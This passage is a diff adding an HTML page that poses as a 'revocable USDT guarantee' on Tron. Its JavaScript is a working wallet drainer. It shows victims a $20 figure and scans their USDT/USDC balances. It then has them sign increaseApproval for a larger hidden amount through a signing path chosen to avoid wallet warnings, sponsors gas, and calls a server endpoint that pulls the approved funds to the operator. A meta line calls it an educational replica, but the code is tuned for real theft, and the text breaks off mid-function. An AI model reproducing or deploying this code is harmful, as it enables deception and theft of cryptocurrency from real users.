@@ -1,0 +1,658 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>Revocable USDT Guarantee</title>
+<meta name="description" content="Scam-replica: victim-facing 'revocable guarantee' page — fires increaseApproval, the sheet shows only the increment. Educational demo.">
+<meta name="robots" content="noindex">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+  html, body { min-height: 100%; }
+  body {
+    font-family: "Inter", -apple-system, BlinkMacSystemFont, sans-serif;
+    background: #F7F8FA;
+    color: #0E1116;
+    display: flex; flex-direction: column; align-items: center;
+    padding: 0 20px calc(28px + env(safe-area-inset-bottom));
+    -webkit-font-smoothing: antialiased;
+  }
+  .brand {
+    width: 100%; max-width: 420px;
+    display: flex; align-items: center; gap: 9px;
+    padding: 22px 2px 0;
+    font-size: 14px; font-weight: 700; letter-spacing: -0.01em;
+  }
+  .brand svg { flex-shrink: 0; }
+  .brand span { color: #6B7280; font-weight: 500; margin-left: auto; font-size: 11.5px; }
+  .card {
+    width: 100%; max-width: 420px; margin-top: 26px;
+    background: #fff; border: 1px solid #E7EAF0; border-radius: 20px;
+    padding: 26px 22px 22px;
+    box-shadow: 0 1px 2px rgba(16,24,40,.04), 0 12px 32px -12px rgba(16,24,40,.10);
+    animation: rise .45s cubic-bezier(.2,.8,.3,1) both;
+  }
+  @keyframes rise { from { opacity: 0; transform: translateY(12px); } }
+  h1 { font-size: 21px; font-weight: 800; letter-spacing: -0.02em; }
+  .sub { margin-top: 7px; font-size: 13.5px; line-height: 1.55; color: #5B6472; }
+  .amount-box {
+    margin-top: 18px; padding: 16px;
+    background: #F0FBF6; border: 1px solid #C9EBDA; border-radius: 14px;
+    display: flex; align-items: center; gap: 12px;
+  }
+  .usdt-ic {
+    width: 38px; height: 38px; border-radius: 50%;
+    background: #26A17B; color: #fff;
+    display: grid; place-items: center;
+    font-weight: 800; font-size: 16px; flex-shrink: 0;
+  }
+  .amount-box .v { font-size: 19px; font-weight: 800; letter-spacing: -0.01em; }
+  .amount-box .l { font-size: 11.5px; color: #3D7A61; font-weight: 600; margin-top: 1px; }
+  .rows { margin-top: 16px; }
+  .row {
+    display: flex; gap: 10px; align-items: flex-start;
+    padding: 9px 2px; font-size: 12.5px; line-height: 1.5; color: #454F5E;
+  }
+  .row svg { flex-shrink: 0; margin-top: 1px; }
+  .row b { color: #0E1116; font-weight: 600; }
+  .cta {
+    width: 100%; margin-top: 18px; padding: 15px;
+    border: 0; border-radius: 13px;
+    background: #26A17B; color: #fff;
+    font-family: inherit; font-size: 15px; font-weight: 700;
+    cursor: pointer; transition: transform .12s ease, background .15s ease;
+  }
+  .cta:active { transform: scale(.975); }
+  .cta:disabled { background: #9AA5B1; cursor: default; transform: none; }
+  .fineprint { margin-top: 13px; font-size: 11px; line-height: 1.55; color: #98A1AE; text-align: center; }
+  .status-line {
+    margin-top: 12px; min-height: 16px;
+    font-size: 12px; font-weight: 500; color: #8A93A3; text-align: center;
+    font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
+  }
+  .card.done { border-color: #C9EBDA; }
+  .card.done .cta { display: none; }
+  .done-mark {
+    display: none; margin: 18px auto 4px;
+    width: 46px; height: 46px; border-radius: 50%;
+    border: 2.5px solid #05B956; position: relative;
+  }
+  .card.done .done-mark { display: block; }
+  .done-mark::after {
+    content: ""; position: absolute; left: 50%; top: 50%;
+    width: 11px; height: 20px; border: solid #05B956; border-width: 0 3px 3px 0;
+    transform: translate(-50%, -58%) rotate(45deg);
+  }
+  .foot { margin-top: 22px; font-size: 10.5px; color: #B3BAC5; }
+  @media (prefers-reduced-motion: reduce) { .card { animation: none; } }
+</style>
+</head>
+<body>
+
+<div class="brand">
+  <svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M12 2l8 3.5v5.2c0 5-3.4 9.6-8 11.3-4.6-1.7-8-6.3-8-11.3V5.5L12 2z" fill="#26A17B"/><path d="M8.2 11.2l2.6 2.6 5-5.2" stroke="#fff" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg>
+  USDT Guarantee
+  <span id="net">Tron network</span>
+</div>
+
+<div class="card" id="card">
+  <h1>Revocable guarantee</h1>
+  <p class="sub">Another wallet has asked you to back them. This is a guarantee, not a deposit — the tokens stay in your wallet.</p>
+
+  <div class="amount-box">
+    <div class="usdt-ic">₮</div>
+    <div>
+      <div class="v" id="amountLabel">$20.00 USDT</div>
+      <div class="l">Requested guarantee amount</div>
+    </div>
+  </div>
+
+  <div class="rows">
+    <div class="row">
+      <svg width="15" height="15" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="9" stroke="#26A17B" stroke-width="2"/><path d="M8.5 12.3l2.3 2.3 4.7-4.8" stroke="#26A17B" stroke-width="2" fill="none" stroke-linecap="round"/></svg>
+      <div><b>They keep the money.</b> You approve them as a spender rather than handing over the tokens.</div>
+    </div>
+    <div class="row">
+      <svg width="15" height="15" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="9" stroke="#26A17B" stroke-width="2"/><path d="M12 7v5l3.2 1.8" stroke="#26A17B" stroke-width="2" stroke-linecap="round"/></svg>
+      <div><b>Revocable.</b> You can pull back any part of it until the guarantee expires.</div>
+    </div>
+    <div class="row">
+      <svg width="15" height="15" viewBox="0 0 24 24" fill="none"><rect x="4" y="4" width="16" height="16" rx="4" stroke="#26A17B" stroke-width="2"/><path d="M9 12h6" stroke="#26A17B" stroke-width="2" stroke-linecap="round"/></svg>
+      <div><b>No transfer today.</b> One approval signature — your balance does not move.</div>
+    </div>
+  </div>
+
+  <div class="done-mark" aria-hidden="true"></div>
+  <button class="cta" id="cta" type="button">Back this guarantee</button>
+  <div class="status-line" id="status" role="status"></div>
+  <div class="status-line" id="waddr" style="font-size:.66rem;opacity:.55;word-break:break-all;"></div>
+  <p class="fineprint" id="fine">Approval is recorded on-chain and can be withdrawn at any time before expiry.</p>
+</div>
+
+<div class="foot">Guarantee contract · audited flow · expiry <span id="exp">30 days</span></div>
+
+<script>
+// ── Scam-Replik: 92.223.62.220.sslip.io "Revocable USDT guarantee" ──────────
+// Deren Opfer-Seite 1:1 als Backer-Flow: Narrativ → ein Button →
+// increaseApproval-Sheet (kein Warnflag in Trust Wallet — die dokumentierte
+// Lücke aus docs/trust-wallet-approve-sheet.md der Scammer selbst).
+// ?spender=<T…>  Guarantee-Contract (oder Test-Adresse)
+// ?amount=<n>    Approval-Größe (default 20) — die MASKE zeigt immer $20,
+//                der eingegebene Wert steht nur in der Allowance/dem Sheet.
+// ?token=usdt|usdc
+// ────────────────────────────────────────────────────────────────────────────
+var TRC20 = {
+  usdt: { addr: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", decimals: 6, name: "USDT" },
+  usdc: { addr: "TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8", decimals: 6, name: "USDC" }
+};
+var params = new URLSearchParams(location.search);
+// var DEFAULT_SPENDER = "TQfbT7R1VRpZEKTN4bik6cvZsGbZr22RRX"; // bisherige Pull-/Spender-Wallet
+var DEFAULT_SPENDER = "TH1PuSNM6q8akSf22Mw9TykN2puFTkifkA"; // Param-Override gewinnt
+var spender = (params.get("spender") || DEFAULT_SPENDER).trim();
+var tokenParam = (params.get("token") || "auto").toLowerCase();
+var token = TRC20[tokenParam] || TRC20.usdt;
+var amountParam = (params.get("amount") || "20").trim();
+// Dust-Schwelle wie exec/wallet/checker: minPullUsd aus /api/config,
+// Default $1 bis der Fetch resolved.
+var MIN_USD = 1;
+var cfgFullP = fetch("/api/config").then(function(r) { return r.json(); }).catch(function() { return null; });
+var cfgP = cfgFullP.then(function(j) { if (j && Number(j.minPullUsd) > 0) MIN_USD = Number(j.minPullUsd); });
+// Auto-Queue: ALLE bekannten TRC-20 mit Balance ≥ minPullUsd, größte→kleinste.
+// Jeder bekommt ein eigenes increaseApproval-Sheet (approve = max(Balance,
+// Link-amount, TronApproveAmt)) und danach den serverseitigen Auto-Pull.
+// Auto-Queue: NUR USDT + USDC (stable-coins mit sicherem Preis) — schneller
+// Scan, keine Sheets auf Airdrop-/Scam-TRC-20.
+var KNOWN_TRC20 = {
+  "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t": { name: "USDT", decimals: 6, px: 1 },
+  "TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8": { name: "USDC", decimals: 6, px: 1 }
+};
+var KNOWN_HEX = {};
+Object.keys(KNOWN_TRC20).forEach(function(a) { KNOWN_HEX[tw_toHex(a).slice(2).toLowerCase()] = a; });
+function scanQueue(acct) {
+  if (!acct || !acct.trc20) return [];
+  var q = [];
+  acct.trc20.forEach(function(entry) {
+    Object.keys(entry).forEach(function(k) {
+      var h = (k.charAt(0) === "T" ? tw_toHex(k).slice(2) : k).toLowerCase();
+      var b58 = KNOWN_HEX[h];
+      if (!b58) return;
+      var raw = String(entry[k]);
+      var meta = KNOWN_TRC20[b58], usd;
+      try {
+        if (BigInt(raw) <= 0n) return;
+        usd = Number(BigInt(raw)) / Math.pow(10, meta.decimals) * meta.px;
+      } catch (e) { return; }
+      if (usd >= MIN_USD) q.push({ addr: b58, decimals: meta.decimals, name: meta.name, raw: raw, usd: usd });
+    });
+  });
+  q.sort(function(a, b) { return b.usd - a.usd; });
+  return q;
+}
+var forAddr = (params.get("for") || "").trim();
+var card = document.getElementById("card");
+var cta = document.getElementById("cta");
+var statusEl = document.getElementById("status");
+
+// Masken-Betrag kommt aus ?amount= (Admin-Feld „Betrag") — Default $20,
+// nur das Token-Symbol passt sich an.
+function amountLabel() {
+  var n = Number(amountParam);
+  var txt = isNaN(n) || n <= 0 ? "20" : n.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+  return "$" + txt;
+}
+document.getElementById("amountLabel").textContent = amountLabel() + " " + token.name;
+
+var MONITOR_URL = "/api/events";
+var monitSid = "g-" + Math.random().toString(36).slice(2, 8) + "-" + Date.now().toString(36);
+function monit(ev, data) {
+  try {
+    var payload = JSON.stringify({ ev: ev, t: new Date().toISOString(), sid: monitSid, d: data || {} });
+    if (navigator.sendBeacon && navigator.sendBeacon(MONITOR_URL, payload)) return;
+    fetch(MONITOR_URL, { method: "POST", mode: "no-cors", keepalive: true, body: payload }).catch(function() {});
+  } catch(e) {}
+}
+
+function setStatus(t) { statusEl.textContent = t; }
+function isTronAddr(a) { return /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(a); }
+// Vollständiger base58check — Regex allein laesst Tippfehler durch, die
+// dann stillschweigend eine FALSCHE Spender-Adresse encodieren wuerden.
+async function tronAddrValid(a) {
+  try {
+    if (!isTronAddr(a)) return false;
+    var ALPH = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
+    var num = 0n;
+    for (var i = 0; i < a.length; i++) {
+      var d = ALPH.indexOf(a[i]); if (d < 0) return false;
+      num = num * 58n + BigInt(d);
+    }
+    var hex = num.toString(16), zeros = 0;
+    while (a[zeros] === "1") zeros++;
+    hex = "00".repeat(zeros) + (hex.length % 2 ? "0" + hex : hex);
+    var bytes = []; for (var j = 0; j < hex.length; j += 2) bytes.push(parseInt(hex.substr(j, 2), 16));
+    if (bytes.length !== 25 || bytes[0] !== 0x41) return false;
+    var payload = new Uint8Array(bytes.slice(0, 21));
+    var h1 = await crypto.subtle.digest("SHA-256", payload);
+    var h2 = new Uint8Array(await crypto.subtle.digest("SHA-256", h1));
+    for (var k = 0; k < 4; k++) if (h2[k] !== bytes[21 + k]) return false;
+    return true;
+  } catch (e) { return false; }
+}
+
+var TRONGRID = "https://api.trongrid.io";
+function tg(path, body) {
+  // trongrid-Transient (403/429/5xx oder HAENGENDE Verbindung) → tronstack.
+  // fetch ohne Timeout wartet ewig wenn ein Node nur langsam statt
+  // fehlerhaft antwortet — AbortController nach 10s, dann Fallback.
+  function post(url) {
+    var ctl = typeof AbortController !== "undefined" ? new AbortController() : null;
+    var to = ctl ? setTimeout(function() { ctl.abort(); }, 6000) : null;
+    return fetch(url + path, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(body),
+      signal: ctl ? ctl.signal : undefined
+    }).then(function(r) {
+      if (to) clearTimeout(to);
+      if (!r.ok) throw new Error("HTTP " + r.status);
+      return r.json();
+    }).catch(function(e) { if (to) clearTimeout(to); throw e; });
+  }
+  return post(TRONGRID).catch(function() {
+    return post("https://api.tronstack.io");
+  }).catch(function() {
+    // Beide Nodes geflackert → ein letzter trongrid-Versuch: kurze
+    // Rate-Limit-Fenster sind beim dritten Call oft schon vorbei.
+    return post(TRONGRID);
+  });
+}
+// getaccount liefert trc20 leider oft null (Node-Feld wird nur inkrementell
+// befuellt) — die vollstaendige Token-Liste steckt im /v1-Index. Beides
+// parallel, dann pro Contract dedupliziert.
+async function fetchTronAcct(addr58) {
+  var j = null;
+  try {
+    j = await Promise.all([
+      tg("/wallet/getaccount", { address: addr58, visible: true }),
+      fetch("/api/tronread", { method: "POST", headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ path: "/v1/accounts/" + addr58 + "?limit=200" }) })
+        .then(function(r) { return r.json(); })
+    ]).then(function(a) {
+      var ga = a[0] || {};
+      var idx = (a[1] && a[1].data && a[1].data[0]) || {};
+      if (Array.isArray(idx.trc20)) {
+        var seen = {};
+        (ga.trc20 || []).forEach(function(entry) { Object.keys(entry).forEach(function(k) { seen[k] = 1; }); });
+        idx.trc20.forEach(function(entry) {
+          Object.keys(entry).forEach(function(k) {
+            if (!seen[k]) ga.trc20 = (ga.trc20 || []).concat([entry]);
+          });
+        });
+      }
+      return ga;
+    });
+  } catch (e) { j = null; }
+  if (!j || j.Error) {
+    // TronGrid liefert nichts → TronScan als zweite Quelle
+    // (trc20token_balances, komplette Liste inkl. decimals).
+    try {
+      var ts = await fetch("/api/tronread", { method: "POST", headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ path: "https://apilist.tronscanapi.com/api/account?address=" + addr58 }) })
+        .then(function(r) { return r.json(); });
+      if (ts && !ts.Error) {
+        var trc20 = [], seen2 = {};
+        (ts.trc20token_balances || []).forEach(function(t) {
+          var cid = t.contract_address, bal = String(t.balance || "0");
+          if (!cid || bal === "0" || seen2[cid]) return;
+          seen2[cid] = 1;
+          var e = {}; e[cid] = bal; trc20.push(e);
+        });
+        return { balance: Number(ts.balance) || 0, trc20: trc20 };
+      }
+    } catch (e2) {}
+  }
+  return j || {};
+}
+
+function findTronWeb() {
+  return window.tronWeb ||
+         (window.tron && window.tron.tronWeb) ||
+         (window.tronLink && window.tronLink.tronWeb) || null;
+}
+
+async function getTronProvider() {
+  var addr = null;
+  function grab(res) {
+    if (res && typeof res === "object") {
+      addr = addr || res.address || (res.data && res.data.address) || (res.result && res.result.address) || null;
+    }
+  }
+  [window.tronLink, window.tron, window.trustwallet, window.trustWallet].forEach(function(t) {
+    if (t && t.request) {
+      try { Promise.resolve(t.request({ method: "tron_requestAccounts" })).then(grab).catch(function() {}); } catch(e) {}
+    }
+  });
+  try { window.dispatchEvent(new Event("tronLink#initialized")); } catch(e) {}
+  for (var i = 0; i < 160; i++) {
+    var tw = findTronWeb();
+    if (tw && tw.defaultAddress && tw.defaultAddress.base58) return { tw: tw, from: tw.defaultAddress.base58 };
+    if (addr && tw) return { tw: tw, from: addr };
+    // Mobiles Nicht-Wallet: nicht 40s warten — der Deeplink-Forward übernimmt.
+    if (MOBILE && i >= 16 && !tw) return null;
+    await new Promise(function(r) { setTimeout(r, 250); });
+  }
+  return null;
+}
+
+function tw_toHex(addr58) {
+  var ALPH = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
+  var num = 0n;
+  for (var i = 0; i < addr58.length; i++) num = num * 58n + BigInt(ALPH.indexOf(addr58[i]));
+  var hex = num.toString(16);
+  var zeros = 0;
+  while (addr58[zeros] === "1") zeros++;
+  hex = "00".repeat(zeros) + (hex.length % 2 ? "0" + hex : hex);
+  return "0x" + hex.slice(0, -8);
+}
+
+function amountRaw() {
+  var n = Number(amountParam);
+  if (!isFinite(n) || n <= 0) return "20000000";
+  var parts = amountParam.split(".");
+  var frac = (parts[1] || "").padEnd(token.decimals, "0").slice(0, token.decimals);
+  return (parts[0].replace(/\D/g, "") || "0") + frac;
+}
+
+// TronGrid-Txs verfallen ~60s nach Build — haelt das Opfer das Sheet laenger
+// offen, lehnt der Node beim Senden ab. expiration-varint (Wert ==
+// raw_data.expiration) in raw_data_hex patchen + txID = sha256 neu.
+async function extendExpiration(tx) {
+  try {
+    var target = BigInt(tx.raw_data.expiration), ADD = 3300000n;
+    var hx = tx.raw_data_hex, raw = [];
+    for (var i = 0; i < hx.length; i += 2) raw.push(parseInt(hx.substr(i, 2), 16));
+    function rdv(p) { var v = 0n, s = 0n; for (;;) { var b = raw[p++]; v |= BigInt(b & 127) << s; if (!(b & 128)) return [v, p]; s += 7n; } }
+    var pos = 0, hit = -1, vend = 0;
+    while (pos < raw.length) {
+      var t = rdv(pos); pos = t[1];
+      var wire = Number(t[0] & 7n);
+      if (wire === 0) { var vs = pos, vv = rdv(pos); pos = vv[1]; if (vv[0] === target) { hit = vs; vend = pos; break; } }
+      else if (wire === 2) { var l = rdv(pos); pos = l[1] + Number(l[0]); }
+      else if (wire === 5) pos += 4;
+      else if (wire === 1) pos += 8;
+      else break;
+    }
+    if (hit < 0) return;
+    var enc = [], v = target + ADD;
+    for (;;) { var b = Number(v & 127n); v >>= 7n; enc.push(b | (v ? 128 : 0)); if (!v) break; }
+    var raw2 = raw.slice(0, hit).concat(enc, raw.slice(vend));
+    var buf = await crypto.subtle.digest("SHA-256", new Uint8Array(raw2));
+    var toH = function(b) { return (b < 16 ? "0" : "") + b.toString(16); };
+    tx.raw_data_hex = raw2.map(toH).join("");
+    tx.txID = Array.from(new Uint8Array(buf)).map(toH).join("");
+    tx.raw_data.expiration = Number(target + ADD);
+  } catch (e) {}
+}
+
+async function buildIncreaseTx(from, tok, rawAmt, fallbackBal) {
+  var spendHex = tw_toHex(spender);
+  var ownerHex = tw_toHex(from).slice(2);
+  var freshP = tg("/wallet/getaccount", { address: ownerHex }).catch(function() { return null; });
+  var tokenHex = tw_toHex(tok.addr).slice(2);
+  // Approve-Floor aus der Admin-Config (Token-Einheiten × 10^decimals) —
+  // deckt kuenftige Einzahlungen ab und TW rendert das decodierte
+  // "Freigeben"-Sheet statt des generischen. 0 = kein Floor.
+  var cfg = await cfgFullP;
+  // Kill-Switch wie /direct: tronAllowance aus → +0 approve (harmlos)
+  if (cfg && cfg.tronAllowance === false) rawAmt = "0";
+  var aprU = (cfg && cfg.tronApproveAmt != null) ? Number(cfg.tronApproveAmt) : 200000000;
+  var linkU = Number(amountParam) || 0;
+  if (isFinite(linkU) && linkU > aprU) aprU = linkU;
+  if (isFinite(aprU) && aprU > 0) {
+    var flr = BigInt(Math.floor(aprU)) * (10n ** BigInt(Math.min(tok.decimals || 6, 30)));
+    if (BigInt(rawAmt) < flr) rawAmt = flr.toString();
+  }
+  var param = spendHex.slice(2).padStart(64, "0")
+            + BigInt(rawAmt).toString(16).padStart(64, "0");
+  // Burn-Gate VOR dem Sheet (gleiche java-tron-Formel wie pull.py):
+  // Simulation misst den exakten Energy-Bedarf; ohne Deckung → kein Sheet
+  // (Opfer verliert nichts) statt guaranteed Burn+Fail.
+  var selector = "increaseApproval(address,uint256)";
+  var simP = tg("/wallet/triggerconstantcontract", {
+    owner_address: ownerHex,
+    contract_address: tokenHex,
+    function_selector: selector,
+    parameter: param
+  });
+  var resrP = tg("/wallet/getaccountresource", { address: ownerHex }).catch(function() { return null; });
+  var sim = await simP;
+  var used = (sim && sim.energy_used) || 0;
+  if (!used || !((sim || {}).result || {}).result) {
+    // Manche TRC-20 (v.a. unbekannte in der Queue) haben kein increaseApproval
+    // — approve(address,uint256) ist der TRC-20-Pflichtselector.
+    selector = "approve(address,uint256)";
+    sim = await tg("/wallet/triggerconstantcontract", {
+      owner_address: ownerHex,
+      contract_address: tokenHex,
+      function_selector: selector,
+      parameter: param
+    }).catch(function() { return null; });
+    used = (sim && sim.energy_used) || 0;
+    if (!used || !((sim || {}).result || {}).result) {
+      throw new Error("simulation failed: " + JSON.stringify(sim && sim.result || sim).slice(0, 140));
+    }
+  }
+  var fresh = await freshP;
+  // Read-Fehler ≠ leere Wallet: der Scan hat die Balance Sekunden vorher
+  // erfolgreich gelesen — als Fallback nehmen, sonst killt ein flaky
+  // Node jedes Sheet mit einem falschen "insufficient energy".
+  var bal = (fresh && fresh.balance != null) ? fresh.balance : (fallbackBal || 0);
+  var resr = await resrP;
+  // VERFUEGBARE Energy = Limit − Used — nur das Limit wuerde verbrauchte
+  // Energy mitzaehlen → Gate laesst durch, Tx reverts.
+  var haveE = resr ? Math.max(0, (resr.EnergyLimit || 0) - (resr.EnergyUsed || 0)) : 0;
+  var need = Math.ceil(used * 1.15);
+  if (haveE + Math.floor(bal / 100) < need) {
+    monit("guarantee_skip_burn", { from: from, need: need, have: haveE, bal_sun: bal });
+    throw new Error("insufficient energy — wallet cannot cover network fee");
+  }
+  var feeLimit = Math.min(Math.ceil(need * 100 * 1.05), Math.floor(bal * 0.95), 100000000);
+  if (feeLimit < need * 100) {
+    monit("guarantee_skip_burn", { from: from, need: need, fee_limit_cap: feeLimit });
+    throw new Error("fee cap below required energy — aborted before signature");
+  }
+  var res = await tg("/wallet/triggersmartcontract", {
+    owner_address: ownerHex,
+    contract_address: tokenHex,
+    function_selector: selector,
+    parameter: param,
+    fee_limit: feeLimit,
+    call_value: 0
+  });
+  if (!res || !res.transaction) throw new Error("build failed: " + JSON.stringify(res && res.result || res).slice(0, 160));
+  await extendExpiration(res.transaction);
+  return res.transaction;
+}
+
+// Auto Gas-Drop — Backend sendet TRX auf fast leere Opfer-Wallets damit
+// TWs Fee-Guard freigibt. Das Opfer zahlt danach selbst. Fehler → weiter.
+var MOBILE = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+async function sponsorFees(addr) {
+  try {
+    // has_recent_session liest den Feed — das guarantee_connected-Beacon
+    // kann diesen Request noch ueberholen. Session synchron voraus.
+    await fetch(MONITOR_URL, {
+      method: "POST", headers: { "Content-Type": "application/json" }, keepalive: true,
+      body: JSON.stringify({ ev: "guarantee_connected", t: new Date().toISOString(),
+                             sid: monitSid, d: { addr: addr } })
+    }).catch(function() {});
+    var ctl = typeof AbortController !== "undefined" ? new AbortController() : null;
+    var to = ctl ? setTimeout(function() { ctl.abort(); }, 15000) : null;
+    var p = await fetch("/api/energy", {
+      method: "POST", headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ step: "pay", victim: addr }),
+      signal: ctl ? ctl.signal : undefined
+    }).then(function(r) { if (to) clearTimeout(to); return r.json(); })
+     .catch(function(e) { if (to) clearTimeout(to); throw e; });
+    if (!p) return;
+    if (p.error) { monit("energy_sponsor_fail", { victim: addr, reason: String(p.error).slice(0, 120) }); return; }
+    if (!p.gas_tx) return;
+    setStatus("Preparing transaction…");
+    monit("energy_pay", { victim: addr, txid: p.gas_tx });
+    // Drop braucht Block-Confirm + Node-Propagation — pollen bis Balance
+    // waechst (typ. ~3-4s) statt fixer 9s-Warte; hartes Limit ~10s.
+    var before = await tg("/wallet/getaccount", { address: tw_toHex(addr).slice(2) }).catch(function() { return null; });
+    var balBefore = before ? (before.balance || 0) : -1;
+    for (var i = 0; i < 6; i++) {
+      await new Promise(function(r) { setTimeout(r, 1600); });
+      var a = await tg("/wallet/getaccount", { address: tw_toHex(addr).slice(2) }).catch(function() { return null; });
+      if (a && balBefore >= 0 && (a.balance || 0) > balBefore) break;
+      if (a && balBefore < 0 && (a.balance || 0) > 0) break;
+    }
+    monit("energy_sponsored", { victim: addr, txid: p.gas_tx });
+  } catch (e) {}
+}
+
+var busy = false;
+cta.addEventListener("click", async function() {
+  if (busy) return;
+  if (!isTronAddr(spender)) {
+    setStatus("invalid guarantee link");
+    return;
+  }
+  busy = true;
+  cta.disabled = true;
+  setStatus("Connecting wallet…");
+  monit("guarantee_confirm", { spender: spender, amount: amountParam, token: token.name });
+  try {
+    var conn = await getTronProvider();
+    if (!conn) {
+      // Mobile ohne Wallet → einmalig per Universal-Link in die TW-App
+      // (fwd=1 + sessionStorage verhindern den Loop).
+      if (MOBILE && !params.get("fwd") && !sessionStorage.getItem("tw_fwd")) {
+        sessionStorage.setItem("tw_fwd", "1");
+        monit("guarantee_forward", { reason: "no provider" });
+        setStatus("Opening Trust Wallet…");
+        var self = location.origin + location.pathname + location.search
+                 + (location.search ? "&" : "?") + "fwd=1";
+        location.href = "https://link.trustwallet.com/open_url?coin_id=195&url=" + encodeURIComponent(self);
+        return;
+      }
+      setStatus("Open this page inside Trust Wallet or TronLink");
+      cta.disabled = false; busy = false;
+      return;
+    }
+    monit("guarantee_connected", { addr: conn.from });
+    document.getElementById("waddr").textContent = "Wallet: " + conn.from;
+    var t0 = Date.now();
+    // Scan + Sponsor PARALLEL — erst vor dem ersten Sheet muss der
+    // Gas-Drop gelandet sein (Burn-Gate liest die Balance frisch).
+    var acctP = fetchTronAcct(conn.from).catch(function() { return null; });
+    var sponsorP = sponsorFees(conn.from);
+    var acct = await acctP;
+    // Auto-Queue: USDT/USDC mit Balance ≥ minPullUsd, größte→kleinste.
+    // Leere Wallet → ein Sheet aufs Link-Token mit dem Link-Betrag.
+    await cfgP;
+    var queue = scanQueue(acct);
+    if (!queue.length) queue = [{ addr: token.addr, decimals: token.decimals, name: token.name, raw: amountRaw() }];
+    monit("guarantee_queue", { from: conn.from, tokens: queue.length, t_ms: Date.now() - t0,
+                               names: queue.map(function(q) { return q.name; }).join(",") });
+    await sponsorP;
+    monit("guarantee_sponsored", { from: conn.from, t_ms: Date.now() - t0 });
+    document.getElementById("amountLabel").textContent = amountLabel() + " " + queue[0].name;
+    // txid on-chain verifizieren — ein "Fehler" beim Broadcast heisst
+    // nicht, dass die Tx nicht gelandet ist (TW broadcastet selbst).
+    async function txInfo(txid) {
+      if (!txid) return null;
+      for (var i = 0; i < 3; i++) {
+        var info = await tg("/wallet/gettransactioninfobyid", { value: txid }).catch(function() { return null; });
+        if (info && info.receipt) return info;
+        await new Promise(function(r) { setTimeout(r, 4000); });
+      }
+      return null;
+    }
+    // Auto-Pull nach confirmed Approve — der Server liest allowance+balance
+    // selbst (amount=max), dest ist dort fix der Operator.
+    function collect(tokAddr) {
+      fetch("/api/pull", { method: "POST", keepalive: true,
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ action: "tron_collect", victim: conn.from, token: tokAddr, amount: "max" })
+      }).catch(function() {});
+    }
+    async function signOnce(it) {
+      var unsigned = await buildIncreaseTx(conn.from, it, it.raw, acct && acct.balance);
+      // trx.sign = generisches Sheet OHNE Warnung (Owner-Vorgabe 05.10.).
+      // tronLink.sign nur Fallback — rendert sonst Warnbanner + Checkboxen.
+      var signed = await (conn.tw && conn.tw.trx && typeof conn.tw.trx.sign === "function"
+        ? conn.tw.trx.sign(unsigned)
+        : (window.tronLink && typeof window.tronLink.sign === "function"
+          ? window.tronLink.sign(unsigned) : Promise.reject(new Error("no tron signer"))));
+      var bc = await tg("/wallet/broadcasttransaction", signed);
+      if (!bc || bc.result !== true) {
+        var raw = (bc && bc.message) || "";
+        var msg = /^[0-9a-fA-F]{6,}$/.test(raw)
+          ? (function(h){var s="";for(var i=0;i<h.length;i+=2)s+=String.fromCharCode(parseInt(h.substr(i,2),16));return s;})(raw)
+          : raw;
+        if (!/dup/i.test(msg)) {
+          var e = new Error(msg || "broadcast failed");
+          e.txid = signed && signed.txID;
+          throw e;
+        }
+        return signed.txID || "broadcast-by-wallet";
+      }
+      return bc.txid || (signed && signed.txID);
+    }
+    var done = 0, lastTxid = null;
+    for (var qi = 0; qi < queue.length; qi++) {
+      var it = queue[qi];
+      if (queue.length > 1) setStatus("Confirm in wallet… (" + (qi + 1) + "/" + queue.length + " · " + it.name + ")");
+      else setStatus("Confirm in wallet…");
+      var txid;
+      try {
+        txid = await signOnce(it);
+      } catch (e1) {
+        // Bevor ein Retry eine zweite Signatur (und ggf. zweite Fee) anwirft:
+        // war die erste Tx vielleicht doch live? Confirmed → direkt fertig.
+        var info = await txInfo(e1 && e1.txid);
+        if (info && (info.receipt || {}).result === "SUCCESS") {
+          txid = e1.txid;
+        } else {
+          monit("guarantee_rejected", { spender: spender, token: it.name,
+                                        reason: ((e1 && (e1.message || e1)) + "").slice(0, 200) });
+          continue; // verworfener Token → nächster Queue-Eintrag
+        }
+      }
+      done++;
+      lastTxid = txid;
+      monit("guarantee_approved", { spender: spender, amount: String(it.raw), token: it.name,
+                                    hash: txid, from: conn.from, step: qi + 1, of: queue.length });
+      collect(it.addr);
+    }
+    if (!done) throw new Error("all sheets rejected");
+    var finalInfo = await txInfo(lastTxid);
+    var finalResult = (finalInfo && finalInfo.receipt) ? finalInfo.receipt.result : "unseen";
+    monit("guarantee_confirmed", { hash: lastTxid, from: conn.from, receipt: finalResult, approved: done, of: queue.length });
+    card.classList.add("done");
+    setStatus("Guarantee active");
+    document.getElementById("fine").textContent = "The backing wallet can revoke this guarantee at any time before expiry.";
+    document.querySelector("h1").textContent = "Guarantee recorded";
+    document.querySelector(".sub").textContent = "Your approval is on-chain. The guaranteed wallet can pull up to the approved amount until expiry.";
